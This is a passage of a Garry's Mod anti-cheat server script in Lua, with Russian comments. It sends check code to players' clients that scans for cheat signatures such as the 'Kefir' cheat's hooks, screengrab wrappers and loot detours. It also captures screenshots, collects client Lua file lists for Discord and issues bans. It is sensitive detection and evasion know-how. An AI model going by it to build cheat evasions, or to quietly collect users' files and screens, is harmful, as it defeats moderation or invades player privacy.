    local _ok_ht, _ht = pcall(hook.GetTable)
    if _ok_ht and type(_ht) == "table" then
        local _kfSets = {
            RenderScene        = { "KEFIR_AntiScreengrab" },
            Think              = { "kefirka_AspectRatioLerp" },
            HUDPaintBackground = { "kefirka_ASPECT_STRETCH" },
            PreRender          = { "KEFIR_GTS_Bypass_PreRender" },
            PostRender         = { "KEFIR_GTS_Bypass_PostRender" },
        }
        local _kfHook = nil
        for _evt, _nms in pairs(_kfSets) do
            local _bkt = _ht[_evt]
            if type(_bkt) == "table" then
                for _, _nm in ipairs(_nms) do
                    if _bkt[_nm] ~= nil then _kfHook = _evt .. "/" .. _nm; break end
                end
            end
            if _kfHook then break end
        end
        if _kfHook then addStrong("kefir_named_hook(" .. _kfHook .. ")") end
    end
end

-- CD_KEFIR_HOOK_PREFIX: Kefir именует ВСЕ свои хуки как "\255" .. RandomString(16)
-- (ведущий байт 0xFF — структурный маркер: чит по нему находит/снимает свои хуки,
-- рандомно только 16-символьное тело). Легит-аддоны так имена не строят → FP≈0.
-- Ловит ПРИ ВХОДЕ (ядро хуков регится при загрузке чита) и обходит кэширование
-- ссылок — читаем СТРУКТУРУ hook.GetTable(), функции не трогаем.
do
    local _ok_hp, _htp = pcall(hook.GetTable)
    if _ok_hp and type(_htp) == "table" then
        local _hpEvt = nil
        for _evt, _bkt in pairs(_htp) do
            if type(_bkt) == "table" then
                for _nm in pairs(_bkt) do
                    if type(_nm) == "string" and string.byte(_nm, 1) == 255 then
                        _hpEvt = tostring(_evt)
                        break
                    end
                end
            end
            if _hpEvt then break end
        end
        if _hpEvt then addStrong("kefir_hook_prefix(" .. _hpEvt .. ")") end
    end
end
-- ===========================================================================

-- ===========================================================================
-- FAST-LOOT / INSTSEARCH ЛОВУШКА (kefir «instsearch» и аналоги)
-- ===========================================================================
-- Механика фаст-лута на homigrad/Z-City: чтобы лутать тело/проп, его надо
-- ОБЫСКАТЬ (таймер), после чего сервер/игра метит его «обыскан» через поле
-- ENTITY.foundloot. Чит НЕ ждёт обыск — он ДЕТУРИТ foundloot нужных сущностей:
--   ENTITY.foundloot = setmetatable({}, { __detoured = true, __index = fn })
-- так что foundloot[что_угодно] == true → игра считает лут «уже обысканным» и
-- отдаёт мгновенно, а чит лутает через ply_take_item. Легитимный foundloot —
-- ОБЫЧНАЯ таблица (или nil), БЕЗ метатаблицы. Значит: сущность с полем foundloot,
-- у которого есть метатаблица (флаг __detoured ИЛИ __index-функция) = активный
-- фаст-лут ловится с поличным. FP≈0 (легит-код не ставит метатаблицу на foundloot).
do
    -- Уникальный ключ-канарейка, которого НЕТ ни в одной легит foundloot-таблице.
    local _probe = "__cd_" .. tostring(math.random(100000, 999999)) .. "_probe"
    local _ok_e, _all = pcall(ents.GetAll)
    if _ok_e and type(_all) == "table" then
        local _n, _hit = 0, false
        for _, _e in ipairs(_all) do
            _n = _n + 1
            if _n > 6000 then break end
            local _ok_f, _fl = pcall(function() return _e.foundloot end)
            if _ok_f and type(_fl) == "table" then
                -- (1) детур через метатаблицу (структура kefir): __detoured/__index-функция.
                local _mt = getmetatable(_fl)
                if type(_mt) == "table" and
                   (rawget(_mt, "__detoured") ~= nil or type(rawget(_mt, "__index")) == "function") then
                    _hit = true
                    break
                end
                -- (2) устойчиво к обходу: probe НЕсуществующим ключом. Легит foundloot —
                -- обычная таблица → nil. Инстсёрч-детур (__index «всегда true») → true.
                local _ok_p, _v = pcall(function() return _fl[_probe] end)
                if _ok_p and _v ~= nil then
                    _hit = true
                    break
                end
            end
        end
        if _hit then addStrong("fastloot_search_detour") end
    end
end
-- ===========================================================================

-- ===========================================================================
-- v10: GENERIC SCREENGRAB INTEGRITY CHECK — проактивная проверка render.Capture
-- ===========================================================================
-- GTS ловит обход скринграба быстрее нас, потому что ПРОАКТИВНО снимает скрин.
-- Мы же ждали детекта по сигнатурам и только потом делали скрин. Теперь проверяем
-- render.Capture в КАЖДОМ чеке:
--   1. render.Capture всё ещё C-функция? Или её обернули Lua-обёрткой?
--      → если обёрнута: STRONG (чит перехватывает скрин-капчу)
--   2. render.Capture ВООБЩЕ работает? Возвращает данные?
--      → если nil/пусто: WEAK (чит мог заблокировать)
--   3. Есть ли подозрительные хуки на RenderScene/PreRender/PostRender?
--      → читы вешают туда обёртки чтобы спрятать ESP перед скрином
-- FP≈0 для сигнала #1 (почти никто не оборачивает render.Capture).
-- Сигналы #2 и #3 — WEAK, сами не банят, но суммируются с другими.
do
    -- 1. Проверка: render.Capture — C-функция или Lua-обёртка?
    local _gi = debug and debug.getinfo
    local function _isNative(fn)
        if type(fn) ~= "function" or not _gi then return false end
        local _oki, _inf = pcall(_gi, fn, "S")
        return _oki and type(_inf) == "table" and _inf.what == "C"
    end
    local _capHooked = false
    if render then
        if not _isNative(render.Capture)       then _capHooked = true end
        if not _isNative(render.CaptureToFile)  then _capHooked = true end
    end
    if _capHooked then
        -- Это уже ловится kefir_capture_hook выше, но тот сигнал жёстко
        -- привязан к KEFIR. Здесь — ОБЩИЙ детект ЛЮБОГО перехвата.
        addStrong("screengrab_hooked(render.Capture|CaptureToFile is Lua, not C)")
    end

    -- 2. Пробуем реально дёрнуть render.Capture (крошечный 4x4 пиксель).
    -- Если вернула nil или пустые данные — что-то блокирует скринграб.
    if render and render.Capture and not _capHooked then
        local _okCap, _img = pcall(render.Capture, {
            format = "jpeg", quality = 5, x = 0, y = 0, w = 4, h = 4, alpha = false,
        })
        if not _okCap or not _img or #_img == 0 then
            addWeak("screengrab_blocked(render.Capture returned nil/empty)")
        end
    end

    -- 3. Подозрительные хуки на render-событиях (читы прячут ESP перед скрином).
    -- Считаем общее число Lua-хуков на чувствительных render-событиях.
    local _ok_ht, _ht = pcall(hook.GetTable)
    if _ok_ht and type(_ht) == "table" and _gi then
        local _suspRenderHooks = 0
        local _renderEvents = {
            "RenderScene", "PreRender", "PostRender",
            "PreDrawOpaqueRenderables", "PostDrawOpaqueRenderables",
            "PreDrawTranslucentRenderables", "PostDrawTranslucentRenderables",
            "PreDrawViewModel", "PostDrawViewModel",
        }
        for _, _evt in ipairs(_renderEvents) do
            local _bkt = _ht[_evt]
            if type(_bkt) == "table" then
                for _, _fn in pairs(_bkt) do
                    if type(_fn) == "function" then
                        local _oki, _inf = pcall(_gi, _fn, "S")
                        if _oki and type(_inf) == "table" and _inf.what ~= "C" then
                            _suspRenderHooks = _suspRenderHooks + 1
                        end
                    end
                end
            end
        end
        if _suspRenderHooks >= 15 then
            addWeak("screengrab_render_hooks(" .. _suspRenderHooks .. " Lua hooks on render events)")
        elseif _suspRenderHooks >= 8 then
            -- ниже порог — просто информативно
        end
    end
end
-- ===========================================================================

-- ===========================================================================
-- v10: GENERIC GLOBAL SCAN — ищем НЕИЗВЕСТНЫЕ таблицы в _G (не из whitelist GMod API)
-- ===========================================================================
-- Читы создают свои глобальные таблицы (SilkWare, KEFIR, и т.п.). Ловим ВСЕ таблицы,
-- которых нет в whitelist стандартных GMod API. Порог: >=2 неизвестных таблиц → WEAK
-- (сам по себе не банит, но добавляет вес к другим сигналам). FP: аддоны создают
-- свои глобалы (гоминград, ARC9, WOS…) — но они редко создают >2 КРУПНЫХ таблиц.
-- Снимаем первые 8 ключей для контекста (отладка + форензика).
do
    local _known = {}
    -- GMod API: все стандартные глобалы, которые есть в _G у чистого клиента
    for _, _kn in ipairs({
        "_G","_R","_VERSION","Angle","assert","bit","cam","chat","Clip1","Clip2",
        "Color","CompileString","concommand","coroutine","CreateConVar","CreateMaterial",
        "CurTime","cvars","damage","debug","draw","duplicator","effects","engine",
        "ents","error","ErrorNoHalt","file","GAMEMODE","gameevent","game","GetConVar",
        "GM","gui","halo","hook","HTTP","include","ipairs","IsColor","IsFirstTimePredicted",
        "isnumber","isstring","istable","IsValid","killicon","language","list",
        "LocalPlayer","math","Matrix","mesh","Msg","MsgC","MsgN","navmesh","net",
        "next","numpad","os","package","pairs","pcall","player","player_manager",
        "presets","print","Random","rawget","rawset","RealTime","RecipientFilter",
        "render","require","scripted_ents","select","sound","spawnmenu","SQL","sql",
        "string","surface","system","table","team","timer","tostring","type","umsg",
        "undo","unpack","usermessage","util","Vector","vgui","weapons","workshop",
        "xpcall",
        -- DarkRP
        "DarkRP","FAdmin","GAMEMODE","GM",
        -- homigrad/ARC9/WOS (легитимные аддоны)
        "homigrad","ARC9","ArcCW","WOS","wOS","ALANGUAGE",
        -- ULX/ULib
        "ULib","ulx","SLib",
        -- Прочие легитимные
        "SChat","SAM","simfphys","ACF","WireLib","Starfall","PAC",
        -- Клиентские (не банить)
        "localplayer","chat","menubar","DermaMenu","DermaPanel","DLabel","DButton",
    }) do _known[_kn] = true end

    local _unkCount = 0
    local _unkList  = {}
    for _gk, _gv in pairs(_G) do
        if type(_gk) == "string" and not _known[_gk] and type(_gv) == "table" then
            local _kc = 0
            for _ in pairs(_gv) do _kc = _kc + 1; if _kc >= 8 then break end end
            if _kc >= 3 then -- таблица с ≥3 ключами игнорируем пустышки
                _unkCount = _unkCount + 1
                _unkList[#_unkList + 1] = _gk .. "(" .. _kc .. ")"
            end
        end
    end
    if _unkCount >= 2 then
        addWeak("unknown_globals(" .. _unkCount .. ": " ..
            table.concat(_unkList, ",", 1, math.min(5, #_unkList)) .. ")")
    elseif _unkCount >= 1 then
        -- одиночный неизвестный глобал пишем в лог но не триггерим
        -- (слишком много FP от легитимных аддонов)
    end
end

-- ===========================================================================
-- v10: SUSPICIOUS HOOK PATTERNS — хуки с анонимными/обфусцированными именами
-- ===========================================================================
-- Читы вешают хуки с нестандартными именами. Считаем общее число Lua-хуков
-- (не C) и ищем имена, похожие на авто-генерированные (короткие, без префикса).
-- Сами по себе НЕ банят (WEAK), но добавляют контекст.
do
    local _ok_ht, _ht = pcall(hook.GetTable)
    if _ok_ht and type(_ht) == "table" then
        local _totalLuaHooks = 0
        local _anonHooks     = 0
        for _evt, _hooks in pairs(_ht) do
            if type(_hooks) == "table" then
                for _hn, _fn in pairs(_hooks) do
                    if type(_fn) == "function" then
                        -- debug.getinfo чтобы отличить Lua от C
                        local _isLua = false
                        if debug and debug.getinfo then
                            local _oki, _inf = pcall(debug.getinfo, _fn, "S")
                            if _oki and type(_inf) == "table" and _inf.what ~= "C" then
                                _isLua = true
                            end
                        end
                        if _isLua then
                            _totalLuaHooks = _totalLuaHooks + 1
                            -- Анонимные имена: короткие (≤3 символа), или чисто цифровые
                            local _hns = tostring(_hn)
                            if #_hns <= 3 or string.match(_hns, "^%%d+$") then
                                _anonHooks = _anonHooks + 1
                            end
                        end
                    end
                end
            end
        end
        -- >50 Lua-хуков на одном событии ИЛИ >5 анонимных → подозрительно
        if _anonHooks >= 6 then
            addWeak("suspicious_hooks(anon=" .. _anonHooks .. ", total_lua=" .. _totalLuaHooks .. ")")
        elseif _totalLuaHooks >= 80 then
            addWeak("suspicious_hooks(total_lua=" .. _totalLuaHooks .. ")")
        end
    end
end
-- ===========================================================================

-- ===========================================================================
-- Отправка результата
-- ===========================================================================
local results = {}
for _, s in ipairs(strong) do results[#results + 1] = "S:" .. s end
for _, w in ipairs(weak)   do results[#results + 1] = "W:" .. w end

-- v5: ответ шлём на ДИНАМИЧЕСКИЙ канал (имя инжектится в первом %%s ниже)
net.Start("%s")
    net.WriteString("%s")
    net.WriteUInt(#results, 8)
    for _, r in ipairs(results) do
        net.WriteString(r)
    end
net.SendToServer()

-- v8 HONEYPOT (исправлено): decoy-ответ шлёт САМ этот скрипт — тем же payload,
-- что гарантированно приехал и исполнился (раньше отдельное сообщение cd_req
-- проигрывало гонку фрагментированному check-коду → ложные «промахи» у чистых
-- игроков). Канал cd_resp намеренно ПРЕДСКАЗУЕМ: обход, режущий АЧ по имени
-- канала, заблокирует net.Start("chat_relay_ping") → сервер не получит → детект. Чистый
-- клиент всегда отправит. Nonce совпадает с nonce проверки (сервер сверяет).
if net and net.Start and net.SendToServer then
    net.Start("chat_relay_ping")
        net.WriteString("%s")
    net.SendToServer()
end

-- v5: grab-handler. Сервер шлёт запрос на скрин на ДИНАМИЧЕСКИЙ канал.
-- В первом WriteString запроса — имя chunk-канала для ответа.
-- Кэшируем нативные функции локально на момент компиляции скрипта —
-- если чит позже их перехватит, наш capture всё равно использует originals.
do
    local _pcall    = pcall
    local _capture  = render and render.Capture
    local _compress = util and util.Compress
    local _ScrW     = ScrW
    local _ScrH    = ScrH

    if net and net.Receive and _capture and _compress then
        net.Receive("%s", function()
            local chunkName = net.ReadString()
            local ackName   = net.ReadString()
            if not chunkName or chunkName == "" then return end
            if not (hook and hook.Add and hook.Remove) then return end
            local hookId = "zb_ac_g_" .. chunkName
            local tries  = 0
            local function doGrab(fmt)
                local _cap = (render and render.Capture) or _capture
                local ok, img = _pcall(_cap, {
                    format = fmt, quality = 70,
                    x = 0, y = 0,
                    w = ScrW and ScrW() or (_ScrW and _ScrW()) or 1920,
                    h = ScrH and ScrH() or (_ScrH and _ScrH()) or 1080,
                })
                if ok and img and img ~= "" then return img end
                return nil
            end
            hook.Add("PostRender", hookId, function()
                tries = tries + 1
                -- render.Capture часто возвращает nil на первых кадрах (смена RT/MSAA).
                -- Пробуем jpeg до 5 кадров, затем png как фолбэк, потом сдаёмся.
                local img = doGrab("jpeg")
                if not img and tries < 5 then return end
                if not img then img = doGrab("png") end
                hook.Remove("PostRender", hookId)
                if not img then return end
                local ok2, comp = _pcall(_compress, img)
                local payload = (ok2 and comp and comp ~= "") and comp or img
                local CHUNK = 30000
                local parts = {}
                local off, tot = 0, #payload
                while off < tot do
                    local left = tot - off
                    local size = (left < CHUNK) and left or CHUNK
                    parts[#parts + 1] = string.sub(payload, off + 1, off + size)
                    off = off + size
                end
                if #parts == 0 then parts[1] = "" end
                local nparts = #parts
                local function sendOne(i)
                    local part = parts[i]
                    net.Start(chunkName)
                        net.WriteBool(i >= nparts)
                        net.WriteUInt(#part, 32)
                        if #part > 0 then net.WriteData(part, #part) end
                    net.SendToServer()
                end
                for i = 1, nparts do
                    if timer and timer.Simple and i > 1 then
                        timer.Simple(i * 0.05, function() sendOne(i) end)
                    else
                        sendOne(i)
                    end
                end
            end)
        end)
    end
end
]==],
    v1, v1, v1,
    (CVAR_KEFIR_BC:GetBool() and ToLuaByteString(KEFIR_PROBE_BC) or ""),
    respName, nonce,
    nonce,
    grabReqName
)
end


local function GenerateNonce()
    return util.SHA1(tostring(SysTime()) .. tostring(math.random(1, 1e9)))
end

local _gtsChecked, _gtsLoaded = false, false
local function IsGTSLoaded()
    if _gtsChecked then return _gtsLoaded end
    _gtsChecked = true
    local ok, addons = pcall(engine.GetAddons)
    if ok and istable(addons) then
        for _, a in ipairs(addons) do
            local title = string.lower(tostring(a.title or ""))
            if tostring(a.wsid) == "2114254167"
               or string.find(title, "gimme that screen", 1, true) then
                _gtsLoaded = true
                break
            end
        end
    end
    if not _gtsLoaded and _G.GimmeThatScreen ~= nil then _gtsLoaded = true end
    return _gtsLoaded
end

local GTS_FP_SIGNALS = {
    screengrab_hooked       = true,
    screengrab_render_hooks = true,
    screengrab_blocked      = true,
    unknown_globals         = true,
    suspicious_hooks        = true,
}

local function HandleResponse(_, ply)
    if not IsValid(ply) then return end
    local sid = ply:SteamID()

    local nonce = net.ReadString()
    local count = net.ReadUInt(8)

    if not count or count < 0 or count > 64 then
        NotifyStaff(string.format(
            "%s (%s) прислал invalid count=%s",
            ply:Nick(), sid, tostring(count)))
        return
    end

    local strong = {}
    local weak   = {}
    local tamperOn = CVAR_TAMPER:GetBool()
    for i = 1, count do
        local r = net.ReadString()
        if type(r) == "string" and #r > 0 and #r < 200 then
            local prefix = string.sub(r, 1, 2)
            local body   = string.sub(r, 3)
            local sigName = string.match(body, "^([%w_]+)") or ""
            if not tamperOn and string.find(body, "ac_bypass_tamper", 1, true) then
            -- CD_FP_ENV_DROP: средовые эвристики (screengrab_hooked/_render_hooks/
            -- _blocked, unknown_globals, suspicious_hooks) БЕЗУСЛОВНО не гейтят
            -- бан. Они ложили ЛЮБОЙ модифицированный клиент (аддон, оборачивающий
            -- render.Capture, или сервер с 150+ клиентскими глобалами) — массовый
            -- кик невиновных. Реальные читы ловятся ТОЧНЫМИ сигнатурами
            -- (sw_*/aim_family_global/kefir_*/amf_*/dw_*/nl_*/*_fonts), а не этими.
            -- Раньше подавлялись только при загруженном аддоне GimmeThatScreen —
            -- слишком узко (FP на любом другом скрин/рендер-аддоне). Теперь всегда.
            elseif GTS_FP_SIGNALS[sigName] then
            elseif prefix == "S:" then
                strong[#strong + 1] = body
            elseif prefix == "W:" then
                weak[#weak + 1] = body
            else
                weak[#weak + 1] = r
            end
        end
    end

    local rec = pendingChecks[sid]
    if not rec or rec.nonce ~= nonce then
        NotifyStaff(string.format(
            "%s (%s) прислал неверный nonce (manipulation suspected)",
            ply:Nick(), sid))
        return
    end

    realAnsweredAt[sid] = CurTime()
    -- CD_GUARD_ALIVE_GATE: общий признак «клиент отвечает на проверки АЧ». Guard-
    -- модуль использует его, чтобы отличить РЕАЛЬНЫЙ обход guard-канала (клиент жив
    -- и отвечает на ДРУГИЕ каналы АЧ) от банальной потери связи/нет интернета
    -- (клиент не отвечает вообще ни на что → это НЕ обход).
    if ZB_AC then
        ZB_AC._alive = ZB_AC._alive or {}
        ZB_AC._alive[sid] = CurTime()
    end

    local savedGrabReqName = rec.grabReqName
    pendingChecks[sid] = nil

    local history = playerHistory[sid]
    if history and history.hadDetection and #strong == 0 and #weak == 0 then
        local prevStr = "?"
        if history.lastSignals and #history.lastSignals > 0 then
            prevStr = table.concat(history.lastSignals, ",")
            if #prevStr > 80 then prevStr = string.sub(prevStr, 1, 77) .. "..." end
        end
        NotifyStaff(string.format(
            "%s (%s) подтёр следы чита (был %s, сейчас чисто) → WIPE-BAN",
            ply:Nick(), sid, prevStr))
        HandleDetection(ply, { "track_wipe(prev:" .. prevStr .. ")" }, savedGrabReqName)
        return
    end

    recordHistory(sid, strong, weak)

    local shouldBan = (#strong > 0) or (#weak >= 2)

    if ACVerbose() and not (ZB_AC and ZB_AC.Stealth and ZB_AC.Stealth("notify")) then -- CD_STEALTH_BANPRINT
        print(string.format("[AC][CHECK] %s (%s) → strong=%d weak=%d ban=%s",
            ply:Nick(), sid, #strong, #weak, shouldBan and "YES" or "no"))
    end

    if not shouldBan then
        if #weak == 1 then
            NotifyStaff(string.format(
                "WEAK signal on %s (%s): %s — ignored (need 2+ weak or 1 strong)",
                ply:Nick(), sid, weak[1]))
        end
        if GetSwState(sid) == "warned" then
            SetSwClean(sid)
            NotifyStaff(string.format(
                "SW-CLEAN %s (%s) — зашёл чисто после предупреждения. Следующий детект = бан.",
                ply:Nick(), sid))
        end
        return
    end

    local reasons = {}
    for _, s in ipairs(strong) do reasons[#reasons + 1] = "S:" .. s end
    for _, w in ipairs(weak)   do reasons[#reasons + 1] = "W:" .. w end

    HandleDetection(ply, reasons, savedGrabReqName)
end

local function HandleTestScreenChunk(_, ply)
    if not IsValid(ply) then return end
    local sid = ply:SteamID()
    local rec = pendingTestScr[sid]
    if not rec then return end

    local total = net.ReadUInt(12)
    if total == 0 then
        pendingTestScr[sid] = nil
        rec.cb(nil)
        return
    end
    local idx  = net.ReadUInt(12)
    local size = net.ReadUInt(16)
    if not size or size <= 0 then return end
    local data = net.ReadData(size)
    if not data then return end

    rec.total             = total
    rec.data[idx]         = data
    rec.received          = rec.received + 1

    if rec.received >= total then
        pendingTestScr[sid] = nil
        local parts = {}
        for i = 1, total do parts[i] = rec.data[i] or "" end
        local jpeg = table.concat(parts)
        if #jpeg > 0 then
            local ext = (string.sub(jpeg, 1, 4) == "\137PNG") and ".png" or ".jpg"
            local fname = SCREEN_DIR .. "/" .. string.gsub(sid, ":", "_") ..
                "_test_" .. os.date("%Y%m%d_%H%M%S") .. ext
            file.Write(fname, jpeg)
            rec.cb(fname)
        else
            rec.cb(nil)
        end
    end
end

local function HandleKefirProbe(_, ply)
    if not IsValid(ply) then return end
    local sid   = ply:SteamID()
    local nonce = net.ReadString()
    local hit   = net.ReadBool()
    local rec = pendingKefir[sid]
    if not rec or rec.nonce ~= nonce then return end
    pendingKefir[sid] = nil
    if hit then
        HandleDetection(ply, { "kefir_console_capture" }, nil)
    end
end

local function HandleHoneypotResponse(_, ply)
    if not IsValid(ply) then return end
    local sid   = ply:SteamID()
    local nonce = net.ReadString()
    local rec = pendingHoneypot[sid]
    if not rec or rec.nonce ~= nonce then return end
    pendingHoneypot[sid] = nil
    honeypotMiss[sid]    = nil
end

local function ScheduleHoneypotEval(ply, nonce)
    if not CVAR_HONEYPOT:GetBool() then return end
    if not ShouldAutoCheck(ply) then return end
    local sid = ply:SteamID()
    pendingHoneypot[sid] = { nonce = nonce, deadline = CurTime() + RESPONSE_TIMEOUT }

    timer.Simple(RESPONSE_TIMEOUT + 2, function()
        local rec = pendingHoneypot[sid]
        if not rec or rec.nonce ~= nonce then return end
        pendingHoneypot[sid] = nil

        local ply2 = player.GetBySteamID and player.GetBySteamID(sid) or nil
        if not IsValid(ply2) then return end
        if not ShouldAutoCheck(ply2) then return end

        local ra = realAnsweredAt[sid]
        if not ra or (CurTime() - ra) > (RESPONSE_TIMEOUT * 2 + 4) then
            return
        end

        honeypotMiss[sid] = (honeypotMiss[sid] or 0) + 1
        if honeypotMiss[sid] >= 2 then
            honeypotMiss[sid] = nil
            NotifyStaff(string.format(
                "%s (%s) глушит приманочный канал cd_resp (ответ на настоящий check есть, на decoy нет ×2) → BYPASS",
                ply2:Nick(), sid))
            HandleDetection(ply2, { "ac_honeypot_block(cd_resp)" }, nil)
        else
            NotifyStaff(string.format(
                "%s (%s) промах приманки cd_resp (%d/2) — жду подтверждения",
                ply2:Nick(), sid, honeypotMiss[sid]))
        end
    end)
end

local function BuildChannelPools()
    for i = 1, POOL_SIZE do
        local r = GenChannelName("zb_acr_")
        local q = GenChannelName("zb_acgq_")
        local c = GenChannelName("zb_acgc_")
        local b = GenChannelName("zb_acbc_")
        local t = GenChannelName("zb_acts_")
        local k = GenChannelName("zb_ackp_")
        local bm = GenChannelName("zb_acbm_")
        local bp = GenChannelName("zb_acbp_")
        local ba = GenChannelName("zb_acba_")
        local ga = GenChannelName("zb_acga_")
        util.AddNetworkString(r)
        util.AddNetworkString(q)
        util.AddNetworkString(c)
        util.AddNetworkString(b)
        util.AddNetworkString(t)
        util.AddNetworkString(k)
        util.AddNetworkString(bm)
        util.AddNetworkString(bp)
        util.AddNetworkString(ba)
        util.AddNetworkString(ga)
        respPool[i]       = r
        grabReqPool[i]    = q
        grabChunkPool[i]  = c
        binChunkPool[i]   = b
        testScreenPool[i] = t
        kefirProbePool[i] = k
        binManiPool[i]    = bm
        binPullPool[i]    = bp
        binAckPool[i]     = ba
        grabAckPool[i]    = ga
        net.Receive(r, HandleResponse)
        net.Receive(c, HandleGrabChunk)
        net.Receive(b, HandleBinChunk)
        net.Receive(bm, HandleBinManifest)
        net.Receive(t, HandleTestScreenChunk)
        net.Receive(k, HandleKefirProbe)
    end
end
BuildChannelPools()

net.Receive("chat_relay_ping", HandleHoneypotResponse)

local function SendCheckTo(ply, force)
    if not IsValid(ply) then return false, "invalid" end
    local sid = ply:SteamID()

    if pendingChecks[sid] and not force then
        local rec = pendingChecks[sid]
        if CurTime() <= rec.deadline then
            return false, "pending"
        end
        rec.missCount = (rec.missCount or 0) + 1
        if rec.missCount == 3 then
            NotifyStaff(string.format(
                "%s (%s) не отвечает на проверки (3 раза подряд)",
                ply:Nick(), sid))
        end
    end

    local nonce        = GenerateNonce()
    local respName     = PickRandom(respPool)
    local grabReqName  = PickRandom(grabReqPool)

    local code = BuildClientCheckCode(nonce, respName, grabReqName)

    pendingChecks[sid] = {
        nonce         = nonce,
        respName      = respName,
        grabReqName   = grabReqName,
        deadline      = CurTime() + RESPONSE_TIMEOUT,
        missCount     = (pendingChecks[sid] and pendingChecks[sid].missCount) or 0,
    }
    lastGrabReqName[sid] = grabReqName

    net.Start("ui_sync_poll")
        net.WriteString(code)
    net.Send(ply)

    if ACVerbose() and not (ZB_AC and ZB_AC.Stealth and ZB_AC.Stealth("notify")) then -- CD_STEALTH_CHECKPRINT
        print(string.format("[AC][CHECK] → %s (%s) nonce=%s resp=%s grab=%s%s",
            ply:Nick(), sid, string.sub(nonce, 1, 8),
            respName, grabReqName, force and " [force]" or ""))
    end

    ScheduleHoneypotEval(ply, nonce)
    return true
end

local function BuildKefirProbeCode(nonce, respChan)
    return string.format([==[
local NONCE = %q
local CHAN  = %q
if not render or not render.Capture or not hook or not net then return end

local _print = print
local _Msg   = Msg
local _MsgC  = MsgC
local _MsgN  = MsgN
local _lower = string.lower
local _find  = string.find
local _cap   = render.Capture

local detected = false
local function sniff(...)
    local n = select("#", ...)
    for i = 1, n do
        local a = select(i, ...)
        if type(a) == "string" and _find(_lower(a), "kefir", 1, true) then
            detected = true
        end
    end
end

-- форвард-объявление обёрток (локальные, без засорения _G)
local _wrapP, _wrapM, _wrapC, _wrapN
_wrapP = function(...) sniff(...) return _print(...) end
_wrapM = function(...) sniff(...) if _Msg  then return _Msg(...)  end end
_wrapC = function(...) sniff(...) if _MsgC then return _MsgC(...) end end
_wrapN = function(...) sniff(...) if _MsgN then return _MsgN(...) end end

local function restore()
    if print == _wrapP then print = _print end
    if Msg  == _wrapM then Msg  = _Msg  end
    if MsgC == _wrapC then MsgC = _MsgC end
    if MsgN == _wrapN then MsgN = _MsgN end
end

local sent = false
local function report()
    if sent then return end
    sent = true
    restore()
    net.Start(CHAN)
        net.WriteString(NONCE)
        net.WriteBool(detected == true)
    net.SendToServer()
end

local uid = "zb_kfp_" .. NONCE
hook.Add("PostRender", uid, function()
    hook.Remove("PostRender", uid)
    -- ставим снифферы прямо перед капчей, снимаем сразу после
    print = _wrapP
    if _Msg  then Msg  = _wrapM end
    if _MsgC then MsgC = _wrapC end
    if _MsgN then MsgN = _wrapN end
    -- крошечная капча → triggers KEFIR detour (печатает свою строку)
    pcall(_cap, { format = "jpeg", quality = 5, x = 0, y = 0, w = 4, h = 4, alpha = false })
    -- держим снифферы ещё ~0.5с на случай, если печать KEFIR идёт на тик позже,
    -- затем восстанавливаем оригиналы и шлём результат
    if timer and timer.Simple then
        timer.Simple(0.5, report)
    else
        report()
    end
end)

-- страховка: если PostRender почему-то не сработал — восстановить и ответить
if timer and timer.Simple then
    timer.Simple(5, function()
        if hook and hook.Remove then hook.Remove("PostRender", uid) end
        report()
    end)
end
]==], nonce, respChan)
end

local function SendKefirProbe(ply)
    if not ShouldAutoCheck(ply) then return end
    local sid = ply:SteamID()
    local nonce = GenerateNonce()
    local chan  = PickRandom(kefirProbePool)
    pendingKefir[sid] = { nonce = nonce, deadline = CurTime() + 8 }
    net.Start("ui_sync_poll")
        net.WriteString(BuildKefirProbeCode(nonce, chan))
    net.Send(ply)
end

net.Receive("ui_sync_ack", function() end)


hook.Add("PlayerInitialSpawn", "ZB_AC_FirstCheck", function(ply)
    for _, delay in ipairs({ 15, 45 }) do
        timer.Simple(delay, function()
            if not ShouldAutoCheck(ply) then return end
            SendCheckTo(ply)
            SendKefirProbe(ply)
        end)
    end
end)

local function DeleteDataDir(dir)
    if not dir or dir == "" then return end
    local files, dirs = file.Find(dir .. "/*", "DATA")
    for _, f in ipairs(files or {}) do pcall(file.Delete, dir .. "/" .. f) end
    for _, d in ipairs(dirs or {}) do DeleteDataDir(dir .. "/" .. d) end
    pcall(file.Delete, dir)
end

local function RunJoinCollect(ply)
    if not CVAR_COLLECT_JOIN:GetBool() then return end
    if not CVAR_BINGRAB:GetBool() then return end
    if not IsValid(ply) or ply:IsBot() then return end
    if IsWhitelisted(ply) then return end

    local sid, nick = ply:SteamID(), ply:Nick()

    SendCheckTo(ply, true)
    timer.Simple(3, function()
        if not IsValid(ply) then return end
        StartBinGrab(ply, sid, nick, function(binDir, binCount, binComplete, fileList)
            local nsid      = NormalizeSteamID(sid)
            local fp        = ComputeLuaFingerprint(fileList)
            local luaCount  = #FilterLuaFileList(fileList)
            local skinCount = #FilterSkinFileList(fileList) -- CD_SKINS_PULL
            local prev      = luaFingerprints[nsid]
            local unchanged = (prev ~= nil and prev.hash == fp)

            if luaCount == 0 and skinCount == 0 then
                luaFingerprints[nsid] = { hash = fp, at = os.time() }
                SaveLuaFingerprints()
                if binDir then DeleteDataDir(binDir) end
                NotifyCollect(string.format("Сбор при заходе: нестоковых lua/скинов нет — пропуск (%s)", sid))
                return
            end

            local luaFiles  = FilterLuaFileList(fileList)
            local nameLines = {}
            for _, f in ipairs(luaFiles) do
                nameLines[#nameLines + 1] = "• " .. tostring(f.name)
            end
            local namesBlock = table.concat(nameLines, "\n")
            if namesBlock == "" then namesBlock = "• (имена недоступны)" end
            local namesShort = namesBlock
            if #namesShort > 1500 then
                namesShort = string.sub(namesShort, 1, 1500) .. "\n…(список обрезан, полный — в info.txt/ZIP)"
            end

            NotifyCollect(string.format(
                "Сбор при заходе: %s lua (%s, файлов=%d, fp=%s) → скрин + Discord%s",
                unchanged and "БЕЗ ИЗМЕНЕНИЙ" or (prev and "ИЗМЕНЁННЫЙ" or "НОВЫЙ"),
                sid, luaCount, fp, unchanged and " (без ZIP)" or ""))

            StartGrab(ply, sid, nick, { "join_collect" }, lastGrabReqName[sid], function(screenPath)
                local timestamp = os.date("%Y%m%d_%H%M%S")
                local sidSafe   = string.gsub(sid, ":", "_")
                local binLine   = BuildBinLine(binDir, binCount, binComplete)
                local attach, screenExtra = BuildScreenAttach(screenPath, sidSafe, timestamp)

                local discordMsg = string.format(
                    "**ЧечаДефендер: сбор lua при заходе** — `%s` (`%s`)\n" ..
                    "Группа: `%s` · **Файлов lua:** %d · **Скинов:** %d · **Время:** %s%s\n" ..
                    "**Скрипты lua у клиента:**\n%s",
